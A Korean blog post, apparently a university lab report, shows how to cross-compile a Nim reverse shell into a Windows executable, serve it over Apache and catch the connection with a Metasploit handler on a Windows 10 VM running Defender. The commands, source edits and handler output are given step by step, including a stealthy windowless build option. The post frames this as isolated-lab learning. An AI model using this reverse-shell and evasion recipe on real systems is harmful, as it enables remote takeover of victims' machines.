---
layout: single
date: 2026-10-11 03:25:00 +0900
title: "Windows 10 Defender 우회 실습: Nim 리버스 셸로 원격 셸 획득"
categories: Hacking
tag: [Windows10, MicrosoftDefender, Nim, ReverseShell, Metasploit, KaliLinux, 보안실습]
toc: true
toc_label: 목차
author_profile: false
header:
  teaser: "/image/2026-10-11-windows10-defender-nim-reverse-shell/hero-defender-lab.png"
---

![Kali Linux와 Windows 10 가상머신으로 구성한 격리 보안 실습 환경](/image/2026-10-11-windows10-defender-nim-reverse-shell/hero-defender-lab.png)

> 본인이 관리하는 **격리된 가상환경(Kali Linux ↔ Windows 10 22H2)** 에서 진행한 대학 보안 실습 기록이다. 허가받지 않은 시스템에서는 실행하면 안 된다.

---

## 실습 개요

Kali Linux에서 Nim으로 작성된 리버스 셸을 Windows x64 PE 파일로 크로스 컴파일하고, Windows 10 22H2 가상머신에서 실행시켜 Kali의 Handler로 원격 셸을 획득하는 과제다.

| 구분 | 환경 |
|---|---|
| **Kali (리스너)** | 192.168.64.2 |
| **Windows 10 (대상)** | 192.168.64.6 |
| **방어 환경** | Windows Defender **활성화 상태** |
| **공격 방식** | Nim 기반 Reverse Shell |
| **컴파일러** | Nim + MinGW-w64 (크로스 컴파일) |
| **파일 전달** | Apache2 웹 서버 |
| **C2 리스너** | Metasploit `multi/handler` |
| **Handler payload** | `windows/x64/shell_reverse_tcp` |
| **획득 세션** | `shell x64/windows` |
| **최종 결과** | ✅ **원격 command shell 획득** |

> ⚠️ 최종 세션은 Meterpreter가 아니라 **Windows command shell** 이다.

---

## 전체 흐름

![소스 준비부터 결과 확인까지의 실습 흐름](/image/2026-10-11-windows10-defender-nim-reverse-shell/workflow-overview.png)

---

## 1. Nim 리버스 셸 소스 다운로드

Nim 언어로 작성된 리버스 셸 소스를 Kali로 가져온다. Nim은 Python과 유사한 문법에 C 수준의 성능을 내는 컴파일 언어로, 크로스 컴파일과 단일 실행 파일 생성에 강점이 있다.

```bash
git clone https://github.com/Sn1r/Nim-Reverse-Shell.git
cd Nim-Reverse-Shell
```

```
Cloning into 'Nim-Reverse-Shell'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 13 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (13/13), 4.22 KiB | 4.22 MiB/s, done.
Resolving deltas: 100% (2/2), done.
```

---

## 2. 소스 내 LHOST / LPORT 수정

`rev_shell.nim` 파일을 열어 **연결을 받을 Kali의 IP와 리스너 포트** 를 지정한다.

리버스 셸은 **Windows가 Kali로 먼저 연결을 시작**하는 구조이므로, `v1`에는 반드시 **Kali의 IP**가 들어가야 한다. 인바운드 방화벽이 막혀 있어도 아웃바운드 연결만 허용되면 통신이 성립한다.

```nim
var
  v = newSocket()
  v1 = "192.168.64.2"   # Kali (리스너) IP
  v2 = "4444"           # Listener Port
```

---

## 3. nim.cfg 생성 (MinGW 크로스 컴파일러 지정)

Kali의 기본 gcc를 사용하면 **Linux ELF 바이너리** 가 생성되어 Windows에서 실행할 수 없다. Nim이 **Windows용 PE 파일을 생성하도록 MinGW-w64 크로스 컴파일러를 명시적으로 지정**한다.

```bash
cat > nim.cfg << 'EOF'
@if mingw:
  gcc.exe = "x86_64-w64-mingw32-gcc"
  gcc.linkerexe = "x86_64-w64-mingw32-gcc"
@end
EOF
```

이 설정이 없으면 Nim은 `/usr/bin/gcc`를 사용해 리눅스용 실행 파일을 만들게 되므로 **반드시 필요**하다.

---

## 4. Windows용 .exe 빌드

MinGW 크로스 컴파일러를 이용하여 **Windows에 배포할 x64 PE 파일** 을 생성한다.

```bash
nim c -d:mingw --app:gui -d:release -d:danger rev_shell.nim
```

| 옵션 | 역할 |
|---|---|
| `-d:mingw` | MinGW를 이용한 Windows 크로스 컴파일 |
| `--app:gui` | GUI 서브시스템 실행 파일 생성 (콘솔 창 없이 은밀 실행) |
| `-d:release` | Release 최적화 적용 |
| `-d:danger` | 일부 런타임 검사 최소화 |

**빌드 결과**:
```
Hint: used config file '/root/Nim-Reverse-Shell/nim.cfg'
Hint: mm: orc; threads: on; opt: speed; options: -d:danger
63381 lines; 1.886s; 91.402MiB peakmem; proj: /root/Nim-Reverse-Shell/rev_shell.nim
[SuccessX]
```

빌드 완료 후 `file` 명령으로 Windows x86-64용 PE32+ 실행 파일이 생성된 것을 확인했다.

![Windows x64용 PE 실행 파일 생성 확인](/image/2026-10-11-windows10-defender-nim-reverse-shell/build-result.png)

---

## 5. Apache 웹 서버에 .exe 파일 업로드

생성된 페이로드를 **Kali의 Apache 웹 루트로 이동** 시켜 Windows에서 브라우저로 다운로드할 수 있게 준비한다.

```bash
sudo mkdir -p /var/www/html/test
sudo cp rev_shell.exe /var/www/html/test/
sudo systemctl start apache2
```

**접근 URL**: `http://192.168.64.2/test/rev_shell.exe`

![격리된 Apache 서버에 배치된 Windows 실행 파일](/image/2026-10-11-windows10-defender-nim-reverse-shell/apache-transfer.png)

---

## 6. Metasploit multi/handler 실행

Metasploit `multi/handler`로 **역방향 연결을 수신할 리스너**를 대기시킨다. 소스 코드의 `v1`/`v2` 값과 반드시 일치해야 한다.

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 192.168.64.2
set LPORT 4444
exploit -j
```

**실행 결과**:
```
[*] Started reverse TCP handler on 192.168.64.2:4444
[*] Exploit running as background job 0.
```

소스 코드의 IP·포트와 Handler의 `LHOST`·`LPORT`가 일치해야 한다.

---

## 7. 파일 다운로드 후 실행 → 셸 획득

**Windows 10** 에서 브라우저로 `http://192.168.64.2/test/rev_shell.exe`를 다운로드하고 **관리자 권한으로 실행**한다.

파일 실행 후 `Command shell session 1 opened`가 출력됐고, 세션 유형은 `shell x64/windows`로 표시됐다. 세션에 접속해 `whoami`와 `systeminfo`가 실행되는 것도 확인했다.

![Windows x64 command shell 세션 생성과 대상 계정 확인](/image/2026-10-11-windows10-defender-nim-reverse-shell/shell-session.png)

## 8. Windows 10 Defender 검사

원격 셸을 획득한 뒤 **"Defender가 켜진 상태에서 이 페이로드가 탐지되는가?"** 를 검증했다. **Windows 보안 → 바이러스 및 위협 방지 → 검사 옵션**에서 `rev_shell.exe`를 사용자 지정 검사했다.

![Windows 탐색기에서 Microsoft Defender 검사 선택](/image/2026-10-11-windows10-defender-nim-reverse-shell/defender-scan-action.png)

![Windows Security 검사 결과 화면](/image/2026-10-11-windows10-defender-nim-reverse-shell/defender-scan-result.png)

### 확인 결과

| 위치 | 상태 |
|---|---|
| **Kali** | 원격 셸 세션 활성 상태 |
| **Windows** | 현재 위협 없음, 검사 파일 수 0개 |

실행 파일과 원격 셸 동작은 확인했지만, Defender 화면에는 `0개 파일을 검사했습니다`라고 표시되어 있다. 따라서 이 캡처만으로 해당 파일의 사용자 지정 검사 결과까지 입증할 수는 없다.

---

## 최종 결과

| 항목 | 결과 |
|---|---|
| Windows x64 PE 파일 생성 | ✅ 성공 |
| Windows 10에서 실행 | ✅ 성공 |
| Kali Handler 연결 | ✅ 성공 |
| 원격 command shell 획득 | ✅ 성공 |
| `whoami` / `systeminfo` 원격 실행 | ✅ 성공 |
| Defender 화면 | 현재 위협 없음, 검사 파일 수 0개 |
| 과제 보고서 제출 | ✅ 완료 |

**정확히 무엇을 성공한 것인가**

> 이번 실습은 Windows 자체의 CVE를 악용한 권한 상승이나 Meterpreter 세션 획득이 **아니다**. 정확한 표현은 "**Nim으로 작성된 리버스 셸을 Kali Linux에서 Windows x64 실행 파일로 크로스 컴파일하고, 격리된 Windows 10 22H2 VM에서 실행하여 Metasploit `multi/handler`에 command shell 세션을 생성한 것**"이다.

Defender 탐지 여부는 Windows와 Defender 버전, 보안 인텔리전스, 보호 설정, 빌드 결과에 따라 달라질 수 있으므로 **모든 Windows 환경에 일반화할 수는 없다.**

---

## 느낀 점

### 알려진 방법은 대부분 막혀 있었다

처음엔 "Metasploit 쓰면 되겠지", "CVE 하나 찾으면 뚫리겠지" 싶었는데, 실제로는 대부분 Defender가 이미 알고 있었다. Unified Remote 취약점도 명령 프롬프트까지는 뚫렸지만 파일 다운로드 단계에서 `Trojan:Win32/Ceprolad.A`로 막혔다. **취약점 익스플로잇 성공과 최종 세션 획득은 완전히 다른 문제**라는 걸 그때 알았다.

### Metasploit 썼다고 다 Meterpreter는 아니었다

세션 열리고 `sessions -l` 쳐보니 타입이 `shell x64/windows`로 떠서 잠깐 멍했다. payload를 `shell_reverse_tcp`로 하면 일반 command shell이 뜬다는 걸 이번에 제대로 알았다. **도구 이름이 아니라 실제 출력을 봐야 한다.**

### 실패한 게 오히려 도움이 됐다

Fiber 방식부터 Unified Remote까지 다 실패했는데, 이 과정에서 "파일 생성 → 전달 → 실행 → 연결 → 세션" 순서로 하나씩 체크하는 습관이 생겼다. **"안 된다"로 끝내지 않고 어느 단계에서 막혔는지 나누는 게** 결국 성공으로 이어졌다.

---

## 참고

- **Nim 리버스 셸 소스**: https://github.com/Sn1r/Nim-Reverse-Shell.git
